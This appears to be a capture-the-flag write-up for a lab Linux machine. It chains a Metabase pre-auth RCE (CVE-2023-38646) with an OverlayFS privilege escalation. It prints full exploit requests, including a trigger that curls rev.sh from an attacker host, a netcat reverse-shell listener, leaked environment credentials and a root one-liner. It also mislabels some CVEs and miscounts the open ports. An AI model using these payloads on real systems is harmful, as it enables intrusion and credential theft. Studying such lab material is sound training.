# Executive Summary
* **Target OS:** Linux (Ubuntu / Docker Environment)
* **Difficulty:** Easy
* **Target IP:** 10.129.229.224
* **Vectors Used:** Metabase Pre-Auth RCE (CVE-2023-38646) & OverlayFS Privilege Escalation (CVE-2023-0386)

---

# 1. Reconnaisance
Port scan has been done via nmap against target machine.
```bash
nmap -sV -sC 10.129.229.224
```
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 04:29 -0400
Nmap scan report for 10.129.229.224
Host is up (0.77s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.95 seconds
```
from the result of scan above, there are three opened ports, which are potentially vulnerable for this system. Detailed information are shown below:
|port|status|service|
|:---|:---|:---|
|22|open|SSH(OpenSSH 8.2p1|
|80|open|http nginx 1.18.0 (Ubuntu)|

---

# 2. Web Enumeration
The webpage was unaccessable before configuring the accessibility via editting `/etc/hosts` file to redirect attacker's machine.
```bash
vi /etc/hosts
```
```bash
127.0.0.1    kali
127.0.0.1  localhost
10.129.229.224  analytical.htb (added for access the web application)
```
The web page was accessible after the change was made.

Similar situation happened when accessing the login page for further enumeration, which was located in subdomain `data.analytical.htb`. 
Same solution applied for encountered situation.
```bash
vi /etc/hosts
```
```bash
127.0.0.1    kali
127.0.0.1  localhost
10.129.229.224  analytical.htb  data.analytical.htb
```

<br>

Successfully gained access to login page via visiting url `data.analytical.htb`.

<img width="700" height="500" alt="image" src="https://github.com/user-attachments/assets/fe2908ed-e520-4101-bb10-104097ed5cb9" />


# 3. Exploitation
## 1. CVE-2023-38646 
Confirmed login page was running by `Metabase` instance, checking the version was necessary for proper exploitation, which was `v0.46.6`.
```bash
curl http://data.analytical.htb | grep version
```
It is confirmed that the version of `Metabase` is vulnerable to `CVE-2023-38646 (Pre-Authentication Remote Code Execution)`, which is occurred because of the accessibility of users accessing a special token called `setup-token` used for completing the setup process. Unauthorized users, as well, could access the `setup-token` even after the setup process is done, since it remained active.

Using Burpsuite, by repeater, to get `setup token`, visiting `/api/session/properties` end point was performed.
```bash
GET /api/session/properties HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
```
Sending the request above allowed to gather `setup token`, which is shown below.
```bash
<SNIP>
setup-token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
<SNIP>
```
Started python listner for sending shell script to the victim's server, listening on port 8000.
```bash
python3 -m http.server
```

Using the token, against `/api/setup/validate` following request was sent to the server.
```bash
POST /api/setup/validate HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 739

{
    "token": "[setup-token]",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
            "advanced-options": false,
            "ssl": true,
"init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('curl http://10.10.16.155:8000/rev.sh -o /tmp/rev.sh')\u000A$$"
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/a5fb3a61-c164-4d47-8723-0e53bd7b0ed8" />
Checking GET request from the server from above, it is confirmed RCE was successful. 

## 2. Shell as Metabase
Using the sent reverse shell code `rev.sh`, on target system's `/tmp` directory, started netcat listner for receiving reverse shell triggered from victim's machine, in this case, port 4444.
```bash
nc -lvnp 4444
```

By changing content of `exec()`, it will trigger the malicious script crafted specifically for reverse shell.
```bash
"init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('bash /tmp/rev.sh')\u000A$$"}
```

The script was triggered, and gaining access as user `metabase` remotely was successful.
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/680cde90-079f-4fe7-bc1d-03b2c8aacbb9" />

---

# 4. Lateral Movement
Realizing the environment was docker container, finding executables that could give user `metabase` escalated privilege was not successful. Looking for another way, further enumeration discovered `.dockerenv` in `/`, which implies environment variable was set, typically contains configurational information. By executing `printenv` or `env`, it was available to see contents of it.
```bash
printenv
```
```bash
MB_DB_PASS=
HOSTNAME=045e0a76ae55
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=3
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/home
```
According to the discovered information, it was successful to gain credential of username `metalytics` from environment variable `META_USER` and `META_PASS`, which allowed SSH into internal server.
<img width="1370" height="704" alt="image" src="https://github.com/user-attachments/assets/679b96cc-f7da-4191-91a0-470aea8c7faa" />

---

# 5. Privilege Escalation
the system didn't allow user `metalytics` to run `sudo` command. Neither suid bit set executables were found.
Checking the version of the Ubuntu system itself, something was discovered.
<img width="1400" height="361" alt="image" src="https://github.com/user-attachments/assets/3f8819eb-da42-41be-8a1e-12a9f445e739" />

## CVE-2023-2640 / CVE-2023-32629
Based on the linux version `6.2.0-25-generic-#25~22.04.2-ubuntu`, it enables scenarios where users can bypass certain
filesystem restrictions by masking filesystems, for example of `nodev` and `nosuid`. Based on the knowledge, following script allows attacker to bypass filesystem restrictions.
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m
&& touch m/*;"
&& u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
<img width="1303" height="167" alt="image" src="https://github.com/user-attachments/assets/90b14525-5b75-453c-a368-773962714eb1" />

<br>

Gaining access as system privilege (`root` user) was successful.

---

# 6. Remediation & Mitigation
* **Updating Metabase:** Updgrade Metabase as recent version that is not exposed to the vulnerability of CVE-2023-38646 immediately.

* **Apply Kernel Patch:** Updating Linux kernel to recent security patched version could prevent local privilege escalation vulnerability (CVE-2023-2640 / CVE-2023-32629).

* **Managing Credential Separately:** Prevent exposed credential in plaintext under container environment being shared with host system.




